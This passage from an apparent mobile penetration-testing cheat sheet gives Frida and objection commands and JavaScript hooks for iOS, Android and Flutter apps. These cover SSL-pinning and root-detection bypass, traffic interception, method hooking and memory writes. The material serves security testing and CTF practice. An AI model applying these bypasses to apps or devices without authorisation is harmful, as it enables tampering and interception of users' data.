<div class="highlight"><pre><span></span><code><span class="k">&gt; </span><span class="ge">ios hooking set return_value "+[&lt;class&gt; &lt;method&gt;]" false</span>
</code></pre></div>
<h3 id="logging_2">Logging</h3>
<p>For both devices and simulators, it's possible to use <code>Console</code>.</p>
<h4 id="logging-on-device">Logging on device</h4>
<p>Use <code>idevicesyslog</code>:</p>
<div class="highlight"><pre><span></span><code>brew<span class="w"> </span>install<span class="w"> </span>libimobiledevice
idevicesyslog<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>MyApp
</code></pre></div>
<h4 id="logging-on-simulator">Logging on simulator</h4>
<p>Logs are located at:</p>
<div class="highlight"><pre><span></span><code>~/Library/Logs/CoreSimulator/&lt;DEVICE ID&gt;/system.log
</code></pre></div>
<p>Where <code>&lt;DEVICE ID&gt;</code> can be found on the <code>Simulator</code> app.</p>
<p>Alternatively, it's possible to get logs with <code>xcrun</code>:</p>
<div class="highlight"><pre><span></span><code>xcrun<span class="w"> </span>simctl<span class="w"> </span>spawn<span class="w"> </span>booted<span class="w"> </span>log<span class="w"> </span>stream<span class="w"> </span>--predicate<span class="w"> </span><span class="s1">'eventMessage contains "&lt;app package&gt;"'</span><span class="w"> </span>--level<span class="w"> </span>debug
</code></pre></div>
<h3 id="faq_1">FAQ</h3>
<h4 id="1-ipa-crashes-without-logs-on-simulator">1. IPA crashes without logs on simulator</h4>
<ol>
<li>Check that the app is compiled for the correct architecture ###Check Architecture</li>
<li>Check that the app is compiled for simulator ###Check target build platform</li>
<li>Check that the simulator's iOS version is at least the minimum supported OS version ###Plist content</li>
<li>Verify that there are no absolute paths from the building machine in the RPATH ###Check runtime paths<ol>
<li>If some path is found, remove it with the following command: <code>install_name_tool -delete_rpath "&lt;absolute path&gt;" &lt;appname&gt;.app/&lt;appname&gt;</code></li>
<li>Re-sign the application with following command: <code>codesign --force --sign - --deep &lt;appname&gt;.app</code></li>
<li>Uninstall and re-install the IPA/APP ###Install IPA/APP on simulator</li>
</ol>
</li>
</ol>
<h4 id="2-objection">2. Objection</h4>
<p>PROBLEM: Crashes with error <code>frida.core.RPCException: ReferenceError: 'ObjC' is not defined</code>:</p>
<ul>
<li>REASON: Frida server has a version still not supported by objection</li>
</ul>
<p>SOLUTION 1  - UPGRADE OBJECTION TO DEV VERSION (until pull request is not merged): </p>
<ol>
<li>Clone the objection repository: <code>git clone https://github.com/sensepost/objection.git</code></li>
<li>Fetch this <a href="https://github.com/sensepost/objection/pull/734">pull request</a>: <code>git fetch origin pull/734/head:objection-pr734</code></li>
<li>Switch to the newly created branch: <code>git switch objection-pr734</code></li>
<li>Install node agent: <code>npm install &amp;&amp; npm run build</code></li>
<li>Install objection (e.g. using pipx): <code>pipx install ./</code></li>
</ol>
<p>SOLUTION 2 - DOWNGRADE FRIDA ON THE iOS DEVICE</p>
<ol>
<li>On the iPhone, get a compatible frida (server) version deb package (e.g for objection 1.11, compatible frida is 16.5.2): <code>wget https://github.com/frida/frida/releases/download/16.5.2/frida_16.5.2_iphoneos-arm64.deb</code></li>
<li>On the iPhone, downgrade frida: <code>dpkg -i frida_16.5.2_iphoneos-arm64.deb</code></li>
<li>On the mac, downgrade frida (client) in the objection virtual environment: <code>python -m pip uninstall frida frida-tools &amp;&amp; python -m pip install frida==16.5.2 frida-tools</code></li>
</ol>
<h3 id="utils_1">Utils</h3>
<h4 id="ios-device">iOS Device</h4>
<p>Get iOS device id:</p>
<div class="highlight"><pre><span></span><code>idevice_id
</code></pre></div>
<p>Get iOS device info:</p>
<div class="highlight"><pre><span></span><code>ideviceinfo
</code></pre></div>
<p>List installed apps:</p>
<div class="highlight"><pre><span></span><code>brew<span class="w"> </span>install<span class="w"> </span>ideviceinstaller
ideviceinstaller<span class="w"> </span>-l
</code></pre></div>
<p>Install IPA:</p>
<div class="highlight"><pre><span></span><code>ideviceinstaller<span class="w"> </span>-i<span class="w"> </span>&lt;ipa&gt;
</code></pre></div>
<p>Uninstall app:</p>
<div class="highlight"><pre><span></span><code>ideviceinstaller<span class="w"> </span>--uninstall<span class="w"> </span>&lt;app<span class="w"> </span>bundle<span class="w"> </span>name&gt;
</code></pre></div>
<p>Create encrypted backup of the iOS device:</p>
<div class="highlight"><pre><span></span><code>idevicebackup2<span class="w"> </span>encryption<span class="w"> </span>on<span class="w"> </span><span class="s2">"&lt;password&gt;"</span>
idevicebackup2<span class="w"> </span>backup<span class="w"> </span>--full<span class="w"> </span>&lt;output<span class="w"> </span>directory&gt;
</code></pre></div>
<p>Restore a backup:</p>
<div class="highlight"><pre><span></span><code>idevicebackup2<span class="w"> </span>restore<span class="w"> </span>--system<span class="w"> </span>--settings<span class="w"> </span>--password<span class="w"> </span><span class="s2">"&lt;password&gt;"</span><span class="w"> </span>&lt;backup<span class="w"> </span>directory&gt;
</code></pre></div>
<p>Get backup information:</p>
<div class="highlight"><pre><span></span><code>idevicebackup2<span class="w"> </span>info<span class="w"> </span>&lt;backup<span class="w"> </span>directory&gt;
</code></pre></div>
<h4 id="macos">MacOS</h4>
<p>Keyboard Shortcuts:</p>
<ul>
<li>Tilde (~) -&gt; Options + 5</li>
<li>Region screenshot to clipboard -&gt; Shift + Command +Control + 4</li>
<li>Backticks (`) -&gt; Options + \</li>
</ul>
<p>Send command output to clipboard:</p>
<div class="highlight"><pre><span></span><code>&lt;command&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>pbcopy
</code></pre></div>
<h3 id="ios-todo_1">iOS - Todo</h3>
<ul>
<li>https://github.com/GhidraEnjoyr/iOS-Reverse-Engineering?tab=readme-ov-file###basics-of-ios</li>
<li>lldb debug</li>
</ul>
<h2 id="flutter_1">Flutter</h2>
<p>Useful resources:</p>
<ul>
<li>https://github.com/ptswarm/reFlutter</li>
</ul>
<h4 id="ssl-pinning-bypass_1">SSL Pinning Bypass</h4>
<p>Usually with <em>frida</em> you can bypass the SSL pinning using the js scripts, but with Flutter is different.</p>
<ul>
<li>You need to load the base address of the .so library and then apply your script.</li>
</ul>
<p>Pay attention if the app is in Release or Debug mode. Because the name of the .so library is different and will not be found by common tools like <em>reflutter</em>.</p>
<div class="highlight"><pre><span></span><code><span class="nd">@override</span>
<span class="n">HttpClient</span><span class="w"> </span><span class="nf">createHttpClient</span><span class="p">(</span><span class="n">SecurityContext</span><span class="o">?</span><span class="w"> </span><span class="n">context</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kd">super</span><span class="p">.</span><span class="na">createHttpClient</span><span class="p">(</span><span class="n">context</span><span class="p">)</span>
<span class="w">    </span><span class="c1">// set proxy</span>
<span class="w">    </span><span class="p">..</span><span class="na">findProxy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">uri</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">"PROXY localhost:8080"</span><span class="p">;</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">}</span>
</code></pre></div>
<p>The following frida script works fine: <a href="https://github.com/NVISOsecurity/disable-flutter-tls-verification">https://github.com/NVISOsecurity/disable-flutter-tls-verification</a></p>
<h3 id="http-traffic-interception_1">HTTP Traffic Interception</h3>
<p>References:</p>
<ul>
<li><a href="https://blog.nviso.eu/2022/08/18/intercept-flutter-traffic-on-ios-and-android-http-https-dio-pinning/">https://blog.nviso.eu/2022/08/18/intercept-flutter-traffic-on-ios-and-android-http-https-dio-pinning/</a></li>
<li><a href="https://blog.nviso.eu/2020/06/12/intercepting-flutter-traffic-on-ios/">https://blog.nviso.eu/2020/06/12/intercepting-flutter-traffic-on-ios/</a></li>
</ul>
<p>Flutter does not use system proxy configuration and it doesn&rsquo;t use the system&rsquo;s certificate store. Therefore, it's not possible to directly intercept the HTTP traffic generated by flutter applications.</p>
<p>The solution for:</p>
<ul>
<li><strong>Android</strong>: use an intermediary apps such as ProxyDroid, Proxifier or <a href="https://github.com/ProxidBean/VProxid">VProxyid</a>.</li>
<li><strong>iOS</strong>: use a VPN and redirect HTTP and HTTP traffic to proxy listening port by mean of iptables. <ul>
<li>Here's a script setting up a Wireguard VPN server and configuring the iptables: <a href="https://github.com/ojack69/jacks-corner/blob/main/scripts/Bash/vpn-proxy.sh">vpn-proxy.sh</a></li>
</ul>
</li>
</ul>
<h2 id="frida-objection_1">Frida &amp; Objection</h2>
<p>References:</p>
<ul>
<li><a href="https://frida.re/docs/javascript-api/#java">https://frida.re/docs/javascript-api/#java</a></li>
</ul>
<p>Useful Resources:</p>
<ul>
<li><a href="https://codeshare.frida.re/browse">https://codeshare.frida.re/browse</a></li>
</ul>
<p>List processes:</p>
<div class="highlight"><pre><span></span><code>//<span class="w"> </span>-U<span class="w"> </span>-<span class="w"> </span>USB<span class="w"> </span>Device
frida-ps<span class="w"> </span>-U

//<span class="w"> </span>-a<span class="w"> </span>-<span class="w"> </span>List<span class="w"> </span>only<span class="w"> </span>applications
frida-ps<span class="w"> </span>-Ua


//<span class="w"> </span>-i<span class="w"> </span>-<span class="w"> </span>List<span class="w"> </span>all<span class="w"> </span>installed<span class="w"> </span>applications
frida-ps<span class="w"> </span>-Uai
</code></pre></div>
<p>Connect to process:</p>
<div class="highlight"><pre><span></span><code>//<span class="w"> </span>Connect<span class="w"> </span>by<span class="w"> </span>name<span class="w"> </span><span class="o">(</span>-n<span class="o">)</span>
frida<span class="w"> </span>-U<span class="w"> </span>-n<span class="w"> </span><span class="s2">"&lt;process name&gt;"</span>

//<span class="w"> </span>Connect<span class="w"> </span>by<span class="w"> </span>package<span class="w"> </span><span class="o">(</span>-f<span class="o">)</span>
frida<span class="w"> </span>-U<span class="w"> </span>-f<span class="w"> </span>com.jack.ovaasolution

objection<span class="w"> </span>--gadget<span class="p">|</span>-g<span class="w"> </span>&lt;package<span class="w"> </span>name&gt;<span class="w"> </span>explore
</code></pre></div>
<p>Await for process to spawn:</p>
<div class="highlight"><pre><span></span><code>frida<span class="w"> </span>-U<span class="w"> </span>-W<span class="w"> </span><span class="s1">'&lt;package name&gt;'</span><span class="w"> </span>
</code></pre></div>
<p>Run script:</p>
<div class="highlight"><pre><span></span><code>//<span class="w"> </span>Run<span class="w"> </span>script<span class="w"> </span>on<span class="w"> </span>load*
frida<span class="w"> </span>-U<span class="w"> </span>-f<span class="w"> </span>&lt;package&gt;<span class="w"> </span>-l<span class="w"> </span>&lt;script&gt;<span class="w"> </span>

//<span class="w"> </span>Run<span class="w"> </span>script<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>attached<span class="w"> </span>process
<span class="o">[</span>frida<span class="o">]</span>-&gt;<span class="w"> </span>%exec<span class="w"> </span>&lt;script&gt;
</code></pre></div>
<p>*Note: a script attached on load will re-run every time it's modified - REPL mode</p>
<p>Patch APK to inject Frida gadget, for non-rooted devices:</p>
<div class="highlight"><pre><span></span><code>//<span class="w"> </span>Get<span class="w"> </span>device<span class="w"> </span>architecture
<span class="o">[</span>adb<span class="w"> </span>shell<span class="o">]</span><span class="w"> </span>getprop<span class="w"> </span>ro.product.cpu.abi
<span class="o">[</span>adb<span class="w"> </span>shell<span class="o">]</span><span class="w"> </span>getprop<span class="w"> </span>ro.product.cpu.abilist<span class="w"> </span><span class="o">(</span>alternative<span class="o">)</span>


objection<span class="w"> </span>patchapk<span class="w"> </span>--source<span class="w"> </span>&lt;apk<span class="w"> </span>path&gt;<span class="w"> </span>-a<span class="w"> </span>&lt;architecture&gt;<span class="w"> </span><span class="o">[</span>--use-aapt2<span class="o">]</span>
</code></pre></div>
<p>Root bypass:</p>
<div class="highlight"><pre><span></span><code>frida<span class="w"> </span>--codeshare<span class="w"> </span>dzonerzy/fridantiroot<span class="w"> </span>-f<span class="w"> </span>&lt;package&gt;

<span class="o">[</span>objection<span class="w"> </span>-g<span class="w"> </span>&lt;package<span class="w"> </span>name&gt;<span class="w"> </span>explore<span class="w"> </span>-s<span class="o">]</span><span class="w"> </span><span class="s2">"android root disable"</span>
</code></pre></div>
<p>List hookable method in class:</p>
<div class="highlight"><pre><span></span><code>objection&gt;<span class="w"> </span>android<span class="w"> </span>hooking<span class="w"> </span>list<span class="w"> </span>class_methods<span class="w"> </span>&lt;classname&gt;
</code></pre></div>
<p>Watch class and class methods invocatations:</p>
<div class="highlight"><pre><span></span><code>objection&gt;<span class="w"> </span>android<span class="w"> </span>hooking<span class="w"> </span>watch<span class="w"> </span>class<span class="w"> </span>&lt;package.class&gt;<span class="w"> </span><span class="o">[</span>--dump-backtrace<span class="w"> </span>--dump-args<span class="w"> </span>--dump-return<span class="o">]</span>

objection&gt;<span class="w"> </span>android<span class="w"> </span>hooking<span class="w"> </span>watch<span class="w"> </span>class_method<span class="w"> </span>&lt;package.class.method&gt;<span class="w"> </span><span class="o">[</span>--dump-backtrace<span class="w"> </span>--dump-args<span class="w"> </span>--dump-return<span class="o">]</span>
</code></pre></div>
<p>Search or write in memory:</p>
<div class="highlight"><pre><span></span><code><span class="nx">objection</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">search</span><span class="w"> </span><span class="s">"&lt;pattern eg: 41 41 41 ?? 41&gt;"</span><span class="w"> </span><span class="p">(</span><span class="o">--</span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="o">--</span><span class="nx">offsets</span><span class="o">-</span><span class="nx">only</span><span class="p">)</span>
<span class="nx">objection</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">write</span><span class="w"> </span><span class="s">"&lt;address&gt;"</span><span class="w"> </span><span class="s">"&lt;pattern eg: 41 41 41 41&gt;"</span><span class="w"> </span><span class="p">(</span><span class="o">--</span><span class="kt">string</span><span class="p">)</span>
</code></pre></div>
<h3 id="code-snippets">Code Snippets</h3>
<p>Read from and transform to byte array:</p>
<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">fromByteArray</span><span class="p">(</span><span class="nx">arr</span><span class="p">){</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">""</span><span class="p">;</span>
<span class="w">    </span><span class="k">for</span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">i</span><span class="o">=</span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">arr</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">){</span>
<span class="w">        </span><span class="nx">result</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span>
<span class="p">}</span>


<span class="kd">function</span><span class="w"> </span><span class="nx">toByteArray</span><span class="p">(</span><span class="nx">str</span><span class="p">){</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="w">    </span><span class="k">for</span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">i</span><span class="o">=</span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">str</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">){</span>
<span class="w">        </span><span class="nx">result</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">str</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">));</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span>
<span class="p">}</span>
</code></pre></div>
<p>Attach to method implementation:</p>
<div class="highlight"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">func</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ObjC</span><span class="p">.</span><span class="nx">classes</span><span class="p">[</span><span class="o">&lt;</span><span class="kd">class</span><span class="o">&gt;</span><span class="p">][</span><span class="o">&lt;</span><span class="nx">method</span><span class="w"> </span><span class="nx">signature</span><span class="o">&gt;</span><span class="p">];</span>
<span class="nx">Interceptor</span><span class="p">.</span><span class="nx">attach</span><span class="p">(</span><span class="nx">func</span><span class="p">.</span><span class="nx">implementation</span><span class="p">,{</span>
<span class="w">    </span><span class="nx">onEnter</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">args</span><span class="p">){</span>
<span class="w">        </span><span class="c1">// do something</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nx">onLeave</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">retval</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// do something</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre></div>
<p>Attach to native functions:</p>
<div class="highlight"><pre><span></span><code><span class="nx">Interceptor</span><span class="p">.</span><span class="nx">attach</span><span class="p">(</span><span class="nx">Module</span><span class="p">.</span><span class="nx">findExportByName</span><span class="p">(</span><span class="s2">"&lt;native lib&gt;"</span><span class="p">,</span><span class="w"> </span><span class="s2">"&lt;function&gt;"</span><span class="p">),</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">onEnter</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">        </span>
<span class="w">        </span><span class="c1">// Set a custom property</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">custom</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"yes"</span><span class="p">;</span>
<span class="w">        </span><span class="c1">// args[0] is a expected to be a pointer to a string</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">Memory</span><span class="p">.</span><span class="nx">readUtf8String</span><span class="p">(</span><span class="nx">args</span><span class="p">[</span><span class="mf">0</span><span class="p">]));</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nx">onLeave</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">retval</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">custom</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">"yes"</span><span class="p">){</span>
<span class="w">            </span><span class="nx">retval</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="c1">// Replace return value</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre></div>
<p>Replace native function implementation:</p>
<div class="highlight"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">strstrPtr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Module</span><span class="p">.</span><span class="nx">getExportByName</span><span class="p">(</span><span class="s1">'libc.so'</span><span class="p">,</span><span class="w"> </span><span class="s1">'strstr'</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">strstr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">NativeFunction</span><span class="p">(</span><span class="nx">strstrPtr</span><span class="p">,</span><span class="w"> </span><span class="s1">'pointer'</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="s1">'pointer'</span><span class="p">,</span><span class="w"> </span><span class="s1">'pointer'</span><span class="p">]);</span>
<span class="w">    </span><span class="nx">Interceptor</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">strstrPtr</span><span class="p">,</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">NativeCallback</span><span class="p">((</span><span class="nx">haystack</span><span class="p">,</span><span class="w"> </span><span class="nx">needle</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">haystackStr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Memory</span><span class="p">.</span><span class="nx">readUtf8String</span><span class="p">(</span><span class="nx">haystack</span><span class="p">);</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">needleStr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Memory</span><span class="p">.</span><span class="nx">readUtf8String</span><span class="p">(</span><span class="nx">needle</span><span class="p">);</span>

<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">haystackStr</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">needleStr</span><span class="p">);</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">strstr</span><span class="p">(</span><span class="nx">haystack</span><span class="p">,</span><span class="w"> </span><span class="nx">needle</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">NativePointer</span><span class="p">(</span><span class="nx">res</span><span class="p">);</span>

<span class="w">    </span><span class="p">},</span><span class="w"> </span><span class="s1">'pointer'</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="s1">'pointer'</span><span class="p">,</span><span class="w"> </span><span class="s1">'pointer'</span><span class="p">]));</span>
</code></pre></div>
<p>Attach to all exported functions of a module:</p>
<div class="highlight"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">lib</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"libfoo.so"</span><span class="p">;</span>
<span class="nx">Module</span><span class="p">.</span><span class="nx">enumerateExportsSync</span><span class="p">(</span><span class="nx">lib</span><span class="p">).</span><span class="nx">map</span><span class="p">((</span><span class="nx">x</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">type</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">"function"</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"[!] Attaching to: "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
<span class="w">            </span><span class="nx">Interceptor</span><span class="p">.</span><span class="nx">attach</span><span class="p">(</span><span class="nx">Module</span><span class="p">.</span><span class="nx">findExportByName</span><span class="p">(</span><span class="nx">lib</span><span class="p">,</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">name</span><span class="p">),</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">onEnter</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"Entering "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
<span class="w">                </span><span class="p">},</span>
<span class="w">                </span><span class="nx">onLeave</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">retval</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"Leaving "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">});</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">});</span>
</code></pre></div>
<p>Attach to module internal function (not exported):</p>
<div class="highlight"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x00000fa0</span><span class="p">;</span><span class="w"> </span><span class="c1">// from radare2 or Ghidra (for Ghidra see this: https://stackoverflow.com/questions/68332781/frida-hook-native-non-exported-functions)</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">baseAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Module</span><span class="p">.</span><span class="nx">getBaseAddress</span><span class="p">(</span><span class="o">&lt;</span><span class="nx">module</span><span class="w"> </span><span class="nx">name</span><span class="o">&gt;</span><span class="p">);</span>
<span class="nx">Interceptor</span><span class="p">.</span><span class="nx">attach</span><span class="p">(</span><span class="nx">baseAddress</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="nx">offset</span><span class="p">),</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">onEnter</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"Entered internal function"</span><span class="p">);</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">buff</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">args</span><span class="p">[</span><span class="mf">0</span><span class="p">];</span>

<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nx">onLeave</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">retval</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"Hex dump the result "</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">hexdump</span><span class="p">(</span><span class="nx">retval</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">offset</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span>
<span class="w">                </span><span class="nx">length</span><span class="o">:</span><span class="w"> </span><span class="mf">24</span><span class="p">,</span><span class="w"> </span>
<span class="w">                </span><span class="nx">header</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
<span class="w">                </span><span class="nx">ansi</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span>
<span class="w">        </span><span class="p">}));</span>
<span class="w">        </span><span class="c1">// OR use saved buffer pointer in the onEnter hook if retval is something different</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">buff</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Memory</span><span class="p">.</span><span class="nx">readByteArray</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">buff</span><span class="p">,</span><span class="nx">numBytes</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">hexdump</span><span class="p">(</span><span class="nx">buff</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">offset</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span>
<span class="w">                </span><span class="nx">length</span><span class="o">:</span><span class="w"> </span><span class="mf">24</span><span class="p">,</span><span class="w"> </span>
<span class="w">                </span><span class="nx">header</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
<span class="w">                </span><span class="nx">ansi</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span>
<span class="w">        </span><span class="p">}));</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre></div>
<p>Scan memory for pattern:</p>
<div class="highlight"><pre><span></span><code><span class="w"> </span><span class="kd">const</span><span class="w"> </span><span class="nx">flagLib</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Process</span><span class="p">.</span><span class="nx">getModuleByName</span><span class="p">(</span><span class="s2">"libflag.so"</span><span class="p">);</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Memory</span><span class="p">.</span><span class="nx">scanSync</span><span class="p">(</span><span class="nx">flagLib</span><span class="p">.</span><span class="nx">base</span><span class="p">,</span><span class="w"> </span><span class="nx">flagLib</span><span class="p">.</span><span class="nx">size</span><span class="p">,</span><span class="w"> </span><span class="s2">"4d 48 4c 7b"</span><span class="p">);</span><span class="w"> </span><span class="c1">// Search for MHL{</span>
